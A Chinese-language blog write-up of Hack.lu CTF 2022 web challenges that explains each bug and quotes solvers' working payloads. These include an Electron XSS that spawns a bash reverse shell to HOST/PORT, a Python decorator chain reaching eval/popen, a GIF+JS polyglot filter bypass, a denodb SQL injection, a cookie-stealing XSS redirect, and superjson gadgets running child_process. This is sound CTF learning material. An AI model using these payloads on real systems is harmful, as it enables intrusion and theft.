---
title: Hack. lu CTF 2022 筆記
date: 2022-10-31 20:05:37
tags: [Security]
categories: [Security]
photos: /img/hacklu-ctf-2022-writeup/cover.png
---

被 web 題電得亂七八糟，基本上什麼都沒解出來。題目的品質都很不錯，學到很多新東西，值得記錄一下。

關鍵字：

1. Electron relaunch to RCE
2. 利用 Python decorator 執行程式碼
3. 透過特殊檔名讓 Apache 不輸出 content type header
4. GIF + JS polyglot
5. 繞過 SQLite 不合法欄位名稱
6. JS 註解 `<!--` 
7. superjson

<!-- more -->

## babyelectron(21 solves)

給你一個 Electron 的 app，目標是 RCE，有一個 bot 會用 app 訪問你的頁面，然後要先找到一個 XSS，這段就先不提了。

這題該開的 security 設置都有開，關鍵是在 preload 裡面有一段這個：

``` js
const RendererApi = {
  invoke: (action, ...args)  => {
      return ipcRenderer.send("RELaction",action, args);
  },
};

// SECURITY: expose a limted API to the renderer over the context bridge
// https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3
contextBridge.exposeInMainWorld("api", RendererApi);
```

在另外一個 JS 則有這樣一段：

``` js
// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and require them here.

app.RELbuy = function(listingId){
  return
}

app.RELsell = function(houseId, price, duration){
  return
}

app.RELinfo = function(houseId){
  return
}

app.RElist = function(listingId){
  return
}

app.RELsummary = function(userId){
 return 
}

ipcMain.on("RELaction", (_e, action, args)=>{
  //if(["RELbuy", "RELsell", "RELinfo"].includes(action)){
  if(/^REL/i.test(action)){
    app[action](...args)  
  }else{
    // ?? 
  }
})
```

看起來沒什麼用，因為那些方法都沒實作。

但重點是你送 `relaunch` 的指令進去也會 match 到，所以你可以執行 [app.relaunch](https://www.electronjs.org/de/docs/latest/api/app#apprelaunchoptions)，在 relaunch 的時候可以指定執行檔位置，就可以 RCE。

DC 裡面 zeyu2001 提供的 payload：

```js
{
  "houseId":"...",
  "token":"...",
  "message":"<img src=x onerror=\"window.api.invoke('relaunch',{execPath: 'bash', args: ['-c', 'bash -i >& /dev/tcp/HOST/PORT 0>&1']})\">",
  "price":""
 }
```

Sudistark 的 writeup：https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md

## Culinary Class Room(6 solves)

這題限制你只能幫一個 class 加上最多 250 個 decorators，而且不能有參數，目標是要能夠執行任意程式碼拿到 flag。

作者的解法是找到一個 list 然後往裡面 push 很多數字，最後丟到 bytes 以後再丟到 eval 去執行，例如說以下程式碼會往 `copyright._Printer__filenames` push 112 這個數字

```py
@copyright._Printer__filenames.append
@memoryview.__basicsize__.__sub__
@staticmethod.__basicsize__.__mul__
@object.__instancecheck__
class a:pass
```

底下是來自 Arusekk 在 DC 貼的 payload：

```python
@print
@list
@eval
@bytes
@copyright._Printer__filenames.__add__
@list
@str.encode
@chr
@len
@StopAsyncIteration.__doc__.format
@copyright._Printer__filenames.append
@len
@OSError.__doc__.format
@copyright._Printer__filenames.append
@len
@len.__doc__.format
@copyright._Printer__filenames.extend
@str.encode
@int.real.__name__.strip
@len.__name__.format
@copyright._Printer__filenames.append
@len
@ValueError.__doc__.format
@copyright._Printer__filenames.append
@len
@Exception.__doc__.format
@copyright._Printer__filenames.append
@len
@OSError.__doc__.format
@copyright._Printer__filenames.append
@len
@StopIteration.__doc__.format
@copyright._Printer__filenames.extend
@str.encode
@open.__name__.format
@copyright._Printer__filenames.append
@len
@set.__doc__.format
@copyright._Printer__filenames.append
@len
@Exception.__doc__.format
@copyright._Printer__filenames.extend
@str.encode
@__import__.__name__.__add__
@str
@tuple
@str.split
@str.lower
@OSError.__name__.rstrip
@TypeError.__name__.format
class room: ...
```

上面的就是在做：

```python
print(list(eval(b'__import__("os",).popen("./rea*")')))
```

因為對 Python 極度不熟，所以來惡補一下。

`__doc__` 可以拿到一個 method 的文件，要在 source code 裡面宣告，像這樣：

``` python
def test():
  """hello"""
print(test.__doc__) # hello
```

原來 Python 有這麼好用的功能，看起來在開發上滿實用的，要輸出成文件什麼的應該比較容易

然後在 Python 裡面可以用 `__builtins__` 拿到內建的所有東西，感覺有點像是 js 的 global 那樣，可以看出有哪些東西可以用。

用 `dir()` 可以列出所有屬性，所以可以自己寫一個遞迴去找出 list，像這樣：

``` python
visited = set()
def search(obj, path):
  for name in dir(obj):
    item = getattr(obj, name)
    new_path = path + "." + name
    if (type(item) == list):
      print(new_path)
      return
    if type(item) not in visited:
      visited.add(type(item))
      search(item, new_path)
      
search(__builtins__, "__builtins__")
```

最後就會找到 `__builtins__.copyright._Printer__filenames` 這個存在於 global 的 list。

而上面貼的解法，找到數字之後用 `@copyright._Printer__filenames.append` 丟進去陣列，回傳值是 `None`，然後利用 `"abc".format(None)` 還是 "abc" 的特性，就可以再把 input 變成想要的字串，然後用 len 去拿到數字。


## YummyGIFs(5 solves)

可以上傳一張 gif（有經過嚴格檢查，要真的是 gif 檔）並搭配標題跟敘述，敘述會過濾之後 render 在畫面上：

``` php
function s($input_str)
{
  $allowed_tags = ['<b>', '</b>', '<i>', '</i>', '<u>', '</u>', '<s>', '</s>', '<br>'];
  $current_str = $input_str;
  while (true) {
    $new_str = preg_replace_callback('/<.*?>/', function ($matches) use ($allowed_tags) {
      return in_array($matches[0], $allowed_tags) ? $matches[0] : '';
    }, $current_str);
    if ($new_str === $current_str) {
      return $new_str;
    }
    $current_str = $new_str;
  }
}
```

看起來很嚴格，但其實可以用未閉合的標籤繞過，像這樣：`<script src="" p="`，所以還是可以插入任意 tag。

接下來問題就是要怎麼讓 src 合法，因為有 CSP self 的關係，所以我們要產生出一個又是 GIF 但又是合法的 JS code，但儘管產出了，因為 content type 是 image/gif，所以瀏覽器還是會報錯，會出現：

> Refused to execute script from 'http://localhost:1234/a.gif' because its MIME type ('image/gif') is not executable.

而解法就是想辦法不要輸出 content type 就好。

因為這個 content type 是 Apache 給的，可以用檔名來繞過，例如說檔名是 `..gif`，就不會給 content type，可參考：https://twitter.com/YNizry/status/1582733545759330306

這招感覺滿值得筆記下來的。

至於怎麼產生 gif + js polyglot，可以參考：https://gist.github.com/ajinabraham/f2a057fb1930f94886a3

順便在這篇順便筆記一下 png 的：[PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE !](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)

## foodAPI(4 solves)

這題的核心程式碼就這一段：

``` js
apiRouter.get("/food/:id", async(ctx) => {
    const id = helpers.getQuery(ctx, { mergeParams: true });
    try {
        const res = await Food.select({id: 'id', name: 'name'}).where(id).all()
        ctx.response.body = res;
    }
    catch (e) {
        console.log(e)
        ctx.response.body = e.name
    }
});
```

`id` 會是個 object，你有完全的掌控權，但是不支援 array 跟 nested object，只能傳單純的物件進去。

目標是 SQL injection。

這題是我看最久而且最認真的一題，直接開 Chrome debugger 進去 trace code，底下簡單講一下內部的運作。

首先會把你傳進去的 object 轉成底下這樣的形式：

``` js
{
  wheres: [
    {field: "any", opeator: "=", value: "123"},
    {field: "name", opeator: "=", value: "hello"}
  ]
}
```

然後丟給 [this._translator.translateToQuery](https://github.com/eveningkid/denodb/blob/v1.0.40/lib/connectors/sqlite3-connector.ts#L55) 去產生出弄好的 SQL query，接著用神秘的字串分割去切，看有沒有 sub query，然後丟到 SQLite 裡面，部分程式碼如下：

``` js
query(queryDescription: QueryDescription): Promise<any | any[]> {
  this._makeConnection();

  const query = this._translator.translateToQuery(queryDescription);
  const subqueries = query.split(/;(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/);

  const results = subqueries.map((subquery, index) => {
    const preparedQuery = this._client.prepareQuery(subquery + ";");
    // ...
  })
  // ...
}
```

切字串的地方之前有出過事，改了之後也還是會出事，但在這題好像無關緊要：https://github.com/eveningkid/denodb/pull/241

這邊產生出來的 query 已經是完整的 SQL query 了，也就是說參數綁定這件事情並不是丟到 SQLite 去做，而是直接用 JS。

那這個完整的 SQL query 到底是怎麼出來的呢？

首先，你的東西會被丟進 query builder 去，執行像這樣的東西：

``` js
queryBuilder = queryBuilder.where(
  where.field,
  where.operator,
  where.value,
);

// 回傳 queryBuilder.toString
```

而那個 `queryBuilder.where` 裡面，基本上就是根據你傳進來的東西去做事，例如說如果我傳：`{field:"id", operator:"=", value:"hello"}`，最後就會執行到：

```js
this._statements.push({
    grouping: 'where',
    type: 'whereBasic',
    column: "id",
    operator: "=",
    value: "name",
    not: this._not(),
    bool: this._bool(),
    asColumn: false,
  });
```

所以最後轉換成字串，就是根據這個 `this._statements` 去弄。

首先它會先根據你這些 where 組出語句來，怎麼個組法呢？就是把 column 用 backtick 包起來，然後把值變成 `?`，像這樣：

```sql
select * from `food` where `id`=? and `name`=?
```

這個所謂的「包起來」，程式碼在：https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274

產生完 SQL query 以後，開始做 data binding，程式碼大概是這樣：https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6

``` js
function formatQuery(sql, bindings, timeZone, client) {
  bindings = bindings == null ? [] : [].concat(bindings);
  let index = 0;
  return sql.replace(/\\?\?/g, (match) => {
    if (match === '\\?') {
      return '?';
    }
    if (index === bindings.length) {
      return match;
    }
    const value = bindings[index++];
    return client._escapeBinding(value, { timeZone });
  });
}
```

把 `?` 取代成字串，然後取代之前會先 escape，escape 的內容就是外面加單引號，然後把字串本身的單引號變成兩個單引號。

看起來沒什麼問題，但是 deno 的 lib 忘記對欄位名稱的 `?` 做 escape 了，所以如果你傳：`{"id":"1", "?": "A"}`，最後出來的 SQL 會是：

```sql
select * from `food` where `id`=? and `?`=? 
```

而 bind 完之後就會變成：

```sql
select * from `food` where `id`='1' and `'A'`=?
```

你會發現 A 那邊可以做 SQL injection，只要先閉合那個反引號就行了。

但問題是這樣會產生不合法的欄位名稱，因為裡面一定有個單引號，像這樣：

```sql
select * from `food` where `id`='1' and `'name`--'=?
```

會出現：

> Error: no such column: 'name

當初做到這邊就卡住了，大概就兩條路：

1. 有其他的漏洞沒注意到
2. 有神奇的 SQLite 語法可以繞過不存在的欄位名稱

答案是後者。

底下這兩種都不會出錯：

```sql
select id from food where `not_exist'` and 0 union select 1;
select id from food where `not_exist'` in () union select 1;
```

不要問我為什麼，我也不知道，感覺是某種語法上的 bug（或 feature XD）

弄出 SQL injection 以後就弄個 time-based 的 query，然後用 xsleak 去測時間即可。或也可以像 terjanq 弄成 error-based 的，效率會再高一點。

其他人的 writeup:

1. parrot https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98
2. terjanq https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436
3. kunte_ https://files.veryhax.ninja/solve-foodapi-hacklu22.html

## HTPL(3 solves)

這題是一個自製的 AST，用 HTML 的方式來組合出 JS，例如說：

``` html
<x-str>hello<x-str>
```

就會被翻譯成 `"hello"`。

目標是偷到 cookie，所以要能夠執行 XSS。這題看很久但沒什麼想法，我有想過是不是透過一些數學運算可以跳脫字串之類的，但沒找到 `\`，想用註解也沒看到 `*` 可以用。

賽後發現想法近了，但忘記 HTML 的註解 `<!--` 也可以用。用小於 + not + 減法就可以湊出註解的符號，像這樣：

``` html
<x-program>
    <x-lt>
        <x-str>a</x-str>
        <x-not>
            <x-dec>
                <x-identifier>1</x-identifier>
            </x-dec>
        </x-not>
    </x-lt>
</x-program>
```

就會翻譯成：

``` js
"a"<!--$1$;
```

最後的分號會被弄掉，於是可以結合下一行的 `[]` 變成存取屬性，像這樣：

```html
<x-program>
    <x-const>
        <x-identifier>a</x-identifier>
        <x-lt>
            <x-str>x</x-str>
            
            <x-not><x-dec>
                <x-identifier>asd</x-identifier>
            </x-dec></x-not>
        </x-lt>        
    </x-const>
    <x-array>
        <x-str>toString</x-str>
    </x-array>
</x-program>
```

會翻譯成：

``` js
const write = (s) => alert(s);
const read = (s) => prompt(s);

const $a$="x"<!--$asd$;
["toString"];
```

也就是 `const $a$="x"["toString"]`

做到這邊好就簡單了，再繼續串下去拿到 function constructor 之後再呼叫即可，像這樣：

``` html
<x-program>

    <x-const>
        <x-identifier>a</x-identifier>
        <x-lt>
            <x-str>x</x-str>
            
            <x-not><x-dec>
                <x-identifier>asd</x-identifier>
            </x-dec></x-not>
        </x-lt>        
    </x-const>
    <x-array>
        <x-str>toString</x-str>
    </x-array>

    <x-const>
        <x-identifier>b</x-identifier>
        <x-lt>
            <x-identifier>a</x-identifier>
            
            <x-not><x-dec>
                <x-identifier>asd</x-identifier>
            </x-dec></x-not>
        </x-lt>        
    </x-const>
    <x-array>
        <x-str>constructor</x-str>
    </x-array>

    <x-const>
        <x-identifier>c</x-identifier>
        <x-call>
            <x-identifier>b</x-identifier>
            <x-str>alert("xss")</x-str>
        </x-call>      
    </x-const>

    <x-call>
        <x-identifier>c</x-identifier>
    </x-call>  
</x-program>
```

會變成：

``` js
const write = (s) => alert(s);
const read = (s) => prompt(s);

const $a$="x"<!--$asd$;
["toString"];
const $b$=$a$<!--$asd$;
["constructor"];
const $c$=($b$)("alert(\"xss\")");
($c$)();
```

terjanq 的[解法](https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436)更短，直接利用 iframe + name 會拿到 window 的特性，去拿 iframe 裡的 eval（那個 if 拿掉也沒差）：

```html
<iframe name=$win$></iframe>
<x-program>
    <x-if>
        <x-num>1</x-num>
        <x-const>
            <x-identifier>test</x-identifier>
        
            <x-lt>
                <x-identifier>win</x-identifier>
                
                <x-not><x-dec>
                    <x-identifier>asd</x-identifier>
                </x-dec></x-not>
            </x-lt>        
        </x-const>
        <x-array>
                <x-str>eval</x-str>
        </x-array>
        <x-call>
            <x-identifier>test</x-identifier>
            <x-str>top.location='https://server/?c='+document.cookie</x-str>
        </x-call>
    </x-if>
</x-program>
```

程式碼會是：

``` js
const write = (s) => alert(s);
const read = (s) => prompt(s);
if(1){
const $test$=$win$<!--$asd$;
["eval"];
($test$)("alert(1337)");
};
```

## JaaSon(6 solves)

同場加映一題 misc 的 JS 題，這題你可以給一個 json string，會被丟到 [superjson](https://github.com/blitz-js/superjson) 去。

用的雖然是有 prototype pollution 漏洞的版本，但是已經先用 `Object.freeze(Object.prototype)` 把 prototype 鎖起來，沒有 prototype pollution 可以用了。

這題還沒時間研究，但跟 superjson 內部運作的機制有關，可以透過 `referentialEqualities` 這東西去指定一些值，例如說：

``` js
{
  "json": {
    "brands": [
      { "name": "Sonar" }
    ],
    "products": [
      { "name": "SonarQube",  "brand": null }
    ]
  },
  "meta": {
    "referentialEqualities": {
      "brands.0": ["products.0.brand"]
    }
  }
}
```

就會執行 `products[0].brand = brands[0];`，看來應該是想透過這個解決 deep clone 時的 reference 問題。


詳情可以參考：[Remote Code Execution via Prototype Pollution in Blitz.js](https://blog.sonarsource.com/blitzjs-prototype-pollution/)，裡面解釋得比較完整。

其餘細節我就沒有再研究了，但看起來是透過這個功能把物件的一些東西換掉，

底下附上 szymex73 在 DC 貼的 payload：

```js
{
   "json":[
      [
         null,
         [
            {
               "value":"console.log(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"
            }
         ]
      ]
   ],
   "meta":{
      "values":{
         "2":[
            "map"
         ]
      },
      "referentialEqualities":{
         "constructor.prototype":[
            "1"
         ],
         "find.constructor":[
            "1.get"
         ],
         "push":[
            "1.set",
            "1.delete"
         ],
         "pop":[
            "1.next",
            "0.keys",
            "1.charAt"
         ],
         "2.constructor.prototype":[
            "1.__proto__",
            "0.0"
         ],
         "0.2":[
            "1.toString"
         ],
         "":[
            [
               [
                  1
               ]
            ]
         ]
      }
   }
}
```

比起上面這個，我隊友 pew 的 payload 似乎比較好懂：

``` js
const superjson = require('superjson').default;

Object.freeze(Object.prototype);

javascript = `console.log(process.mainModule.require('child_process').execSync("/readflag").toString())`

var json = JSON.stringify(
    {
        json: {
            real_error: {
                "message": "",
            },
            real_map: [],
            fake_map: [""],
            real_str: "xxd",
            real_arr: [],
            x: javascript,
            js: javascript,
        },
        meta: {
          referentialEqualities: {
            'real_error.toString': ['fake_map.toString'],
            'constructor.constructor': ['fake_map.get'],
            'real_str.replace': ['fake_map.set'],
            'js': ['fake_map.name'],
            'real_arr.constructor.prototype.values': ['fake_map.keys'],
            'real_map.__proto__' : ['fake_map.__proto__'],
            'x': ['fake_map.0']
          },
          values: {
              real_map: [
                  "map"
              ],
              real_error: [
                  "Error"
              ]
          }
        },
    }
)
console.log(json)
console.log("")
```

## 後記

這次的題目都很有趣而且很新穎，例如說 Python 那題只用 decorator 做出任意程式碼執行就很酷，或是 foodAPI 直接考一個 denoDB 0-day，也是滿猛的。

SQLite 的神秘語法也是大開眼界，期待之後有人 po 出 write-up，從原始碼去解釋一下是哪一段有那個功能，到底是 feature 還是 bug。

而 HTPL 其實最後的考點還是 JS 的註解 `<!--`，但被包裝起來以後就不是這麼容易發現，這種「拆開之後發現是自己熟悉的東西」，以題目來說我覺得滿理想的。

例如說像是 gif 那題，如果我沒解出來，我只會覺得我知識量不足，不知道 `..gif` 可以繞，或覺得看 code 能力不足，沒辦法看太底層。但像是 HTPL 這題，沒解出來但發現原來知識點是自己知道的，就會覺得題目包裝得十分巧妙。

突然覺得跟以前一些競程的題目有點像，有些題目解不出來是因為我真的沒學過那演算法，但有些題目層層拆解之後發現不會太難，只是包裝得很好，就會覺得「哇，這出題者好猛」

話說 terjanq 在我心目中是 CTF 界中前端、瀏覽器以及 JS 相關題目的 GOAT，感覺只要是這類型的題目，他就一定解得出來，真的很猛。

當然，其他強者也不是蓋的，每次都會發現難題幾乎都是固定那幾個 id 解掉XD
